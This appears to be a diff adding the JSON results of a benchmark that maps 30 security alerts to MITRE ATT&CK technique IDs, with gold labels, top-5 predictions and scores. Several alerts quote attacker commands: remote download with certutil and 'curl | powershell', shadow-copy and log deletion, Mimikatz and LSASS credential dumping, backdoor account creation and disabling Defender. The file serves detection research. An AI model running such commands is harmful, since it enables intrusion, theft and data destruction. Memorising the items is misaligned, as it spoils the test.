@@ -1,0 +1,470 @@
+{
+ "summary": {
+  "n": 30,
+  "P@1": 0.6,
+  "Hit@3": 0.8,
+  "Hit@5": 0.8666666666666667,
+  "Tactic@1": 0.6666666666666666
+ },
+ "items": [
+  {
+   "text": "CrowdStrike: Process rundll32.exe loaded comsvcs.dll and invoked MiniDump against PID 672 (lsass.exe). Output written to C:\\Windows\\Temp\\debug.bin",
+   "gold": [
+    "T1003"
+   ],
+   "top5": [
+    "T1218",
+    "T1003",
+    "T1055",
+    "T1127",
+    "T1202"
+   ],
+   "top1_ok": false,
+   "hit5": true
+  },
+  {
+   "text": "Defender for Endpoint: 'powershell.exe -nop -w hidden -encodedcommand JABjAGwAaQBlAG4AdAAgAD0A' launched by excel.exe on FIN-LT-0921",
+   "gold": [
+    "T1059"
+   ],
+   "top5": [
+    "T1059",
+    "T1027",
+    "T1564",
+    "T1546",
+    "T1685"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "Proofpoint TAP: user a.martin clicked a URL in an email impersonating DocuSign; landing page harvested O365 credentials",
+   "gold": [
+    "T1566"
+   ],
+   "top5": [
+    "T1204",
+    "T1078",
+    "T1598",
+    "T1684",
+    "T1566"
+   ],
+   "top1_ok": false,
+   "hit5": true
+  },
+  {
+   "text": "Sysmon 13 RegistryValueSet: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater -> C:\\Users\\Public\\upd.exe",
+   "gold": [
+    "T1547"
+   ],
+   "top5": [
+    "T1112",
+    "T1547",
+    "T1012",
+    "T1218",
+    "T1036"
+   ],
+   "top1_ok": false,
+   "hit5": true
+  },
+  {
+   "text": "Event 4698: A scheduled task was created. Task Name: \\Microsoft\\Windows\\Maintenance\\SysCheck Command: C:\\ProgramData\\svc.exe Author: SYSTEM",
+   "gold": [
+    "T1053"
+   ],
+   "top5": [
+    "T1053",
+    "T1036",
+    "T1059",
+    "T1082",
+    "T1003"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "vssadmin.exe delete shadows /all /quiet executed on FILESRV01 followed by wbadmin delete catalog -quiet",
+   "gold": [
+    "T1490"
+   ],
+   "top5": [
+    "T1490",
+    "T1070",
+    "T1059",
+    "T1485",
+    "T1685"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "EDR: 4,200 files renamed with extension .akira in 3 minutes on \\\\NAS01\\finance; ransom note akira_readme.txt created",
+   "gold": [
+    "T1486"
+   ],
+   "top5": [
+    "T1036",
+    "T1486",
+    "T1070",
+    "T1657",
+    "T1027"
+   ],
+   "top1_ok": false,
+   "hit5": true
+  },
+  {
+   "text": "Zeek: host 10.4.2.19 sent 25,000 DNS queries with long random TXT subdomains to update-cdn-x.example; possible DNS tunnel",
+   "gold": [
+    "T1071"
+   ],
+   "top5": [
+    "T1071",
+    "T1568",
+    "T1572",
+    "T1048",
+    "T1132"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "Firewall: 9.8 GB uploaded over HTTPS from DB-02 to mega.nz within 40 minutes outside business hours",
+   "gold": [
+    "T1567"
+   ],
+   "top5": [
+    "T1071",
+    "T1686",
+    "T1567",
+    "T1041",
+    "T1048"
+   ],
+   "top1_ok": false,
+   "hit5": true
+  },
+  {
+   "text": "Event 4625 x 3,412: failed logons for 380 distinct accounts from 203.0.113.50 against the VPN portal in 15 minutes",
+   "gold": [
+    "T1110"
+   ],
+   "top5": [
+    "T1078",
+    "T1133",
+    "T1110",
+    "T1087",
+    "T1190"
+   ],
+   "top1_ok": false,
+   "hit5": true
+  },
+  {
+   "text": "net.exe group \"Domain Admins\" /domain and nltest /dclist:corp.local executed by user svc_backup",
+   "gold": [
+    "T1018",
+    "T1069"
+   ],
+   "top5": [
+    "T1069",
+    "T1482",
+    "T1033",
+    "T1087",
+    "T1059"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "PsExec service PSEXESVC installed on HR-PC-14 from 10.1.1.20 using account CORP\\it-admin; remote cmd.exe spawned",
+   "gold": [
+    "T1021",
+    "T1569"
+   ],
+   "top5": [
+    "T1569",
+    "T1059",
+    "T1078",
+    "T1543",
+    "T1021"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "wevtutil.exe cl Security and wevtutil cl System executed on DC02 by an interactive session",
+   "gold": [
+    "T1070"
+   ],
+   "top5": [
+    "T1685",
+    "T1021",
+    "T1059",
+    "T1055",
+    "T1559"
+   ],
+   "top1_ok": false,
+   "hit5": false
+  },
+  {
+   "text": "certutil.exe -urlcache -split -f http://198.51.100.7/a.txt C:\\Users\\Public\\a.exe",
+   "gold": [
+    "T1105"
+   ],
+   "top5": [
+    "T1059",
+    "T1027",
+    "T1218",
+    "T1140",
+    "T1105"
+   ],
+   "top1_ok": false,
+   "hit5": true
+  },
+  {
+   "text": "Mimikatz signature detected: sekurlsa::logonpasswords and lsadump::dcsync /user:krbtgt",
+   "gold": [
+    "T1003"
+   ],
+   "top5": [
+    "T1003",
+    "T1550",
+    "T1027",
+    "T1556",
+    "T1558"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "Web WAF: POST /cgi-bin/login exploited CVE-2024-3400 on the internet-facing GlobalProtect gateway, spawning a reverse shell",
+   "gold": [
+    "T1190"
+   ],
+   "top5": [
+    "T1190",
+    "T1059",
+    "T1505",
+    "T1210",
+    "T1203"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "Rclone.exe copy \\\\FS01\\Projects remote:backup --transfers 16 observed on a server with no backup software",
+   "gold": [
+    "T1048",
+    "T1567"
+   ],
+   "top5": [
+    "T1570",
+    "T1105",
+    "T1008",
+    "T1003",
+    "T1490"
+   ],
+   "top1_ok": false,
+   "hit5": false
+  },
+  {
+   "text": "Office process WINWORD.EXE spawned mshta.exe http://cdn.example.org/payload.hta",
+   "gold": [
+    "T1218"
+   ],
+   "top5": [
+    "T1218",
+    "T1055",
+    "T1027",
+    "T1057",
+    "T1204"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "Shortcut file invoice.lnk executed by user from Downloads folder, launching cmd.exe /c curl | powershell",
+   "gold": [
+    "T1204"
+   ],
+   "top5": [
+    "T1059",
+    "T1105",
+    "T1204",
+    "T1547",
+    "T1218"
+   ],
+   "top1_ok": false,
+   "hit5": true
+  },
+  {
+   "text": "AWS GuardDuty: IAM user ci-deploy called ListBuckets, GetBucketAcl and ListObjects across 140 S3 buckets from a TOR exit node",
+   "gold": [
+    "T1580",
+    "T1619"
+   ],
+   "top5": [
+    "T1090",
+    "T1059",
+    "T1213",
+    "T1550",
+    "T1078"
+   ],
+   "top1_ok": false,
+   "hit5": false
+  },
+  {
+   "text": "Azure AD: new inbox rule 'move to RSS Feeds' created that forwards all mail containing 'invoice' to an external gmail address",
+   "gold": [
+    "T1114",
+    "T1564"
+   ],
+   "top5": [
+    "T1114",
+    "T1020",
+    "T1566",
+    "T1078",
+    "T1585"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "AnyDesk.exe installed silently with --install --start-with-win --silent on 12 workstations by a non-IT account",
+   "gold": [
+    "T1219"
+   ],
+   "top5": [
+    "T1219",
+    "T1078",
+    "T1543",
+    "T1564",
+    "T1059"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "Process injection: notepad.exe executed with no arguments and opened a network connection to 45.9.148.3:443 after WriteProcessMemory from a parent dropper",
+   "gold": [
+    "T1055"
+   ],
+   "top5": [
+    "T1055",
+    "T1070",
+    "T1106",
+    "T1559",
+    "T1105"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "whoami /all; ipconfig /all; systeminfo; tasklist executed in quick succession from a newly created cmd.exe",
+   "gold": [
+    "T1016",
+    "T1033",
+    "T1082"
+   ],
+   "top5": [
+    "T1033",
+    "T1016",
+    "T1082",
+    "T1057",
+    "T1047"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "7z.exe a -p -mhe=on C:\\Temp\\out.7z C:\\Users\\*\\Documents executed prior to large outbound transfer",
+   "gold": [
+    "T1560"
+   ],
+   "top5": [
+    "T1059",
+    "T1074",
+    "T1570",
+    "T1204",
+    "T1105"
+   ],
+   "top1_ok": false,
+   "hit5": false
+  },
+  {
+   "text": "Kerberos: a burst of TGS requests with RC4 encryption for 57 service accounts from a single workstation (possible Kerberoasting)",
+   "gold": [
+    "T1558"
+   ],
+   "top5": [
+    "T1558",
+    "T1573",
+    "T1078",
+    "T1550",
+    "T1557"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "New local administrator account 'support$' created via net user support$ P@ss /add && net localgroup administrators support$ /add",
+   "gold": [
+    "T1098",
+    "T1136"
+   ],
+   "top5": [
+    "T1136",
+    "T1098",
+    "T1087",
+    "T1078",
+    "T1069"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "Windows Defender real-time protection disabled via Set-MpPreference -DisableRealtimeMonitoring $true",
+   "gold": [
+    "T1685"
+   ],
+   "top5": [
+    "T1685",
+    "T1497",
+    "T1686",
+    "T1112",
+    "T1678"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "Beacon traffic: host contacts 185.243.115.8 over HTTPS every 60 seconds with 10% jitter and identical JA3 fingerprint",
+   "gold": [
+    "T1071",
+    "T1573"
+   ],
+   "top5": [
+    "T1071",
+    "T1571",
+    "T1082",
+    "T1573",
+    "T1572"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  },
+  {
+   "text": "Screen capture utility saved 340 screenshots to %APPDATA%\\cache\\img over 2 hours",
+   "gold": [
+    "T1113"
+   ],
+   "top5": [
+    "T1113",
+    "T1074",
+    "T1105",
+    "T1125",
+    "T1056"
+   ],
+   "top1_ok": true,
+   "hit5": true
+  }
+ ]
+}
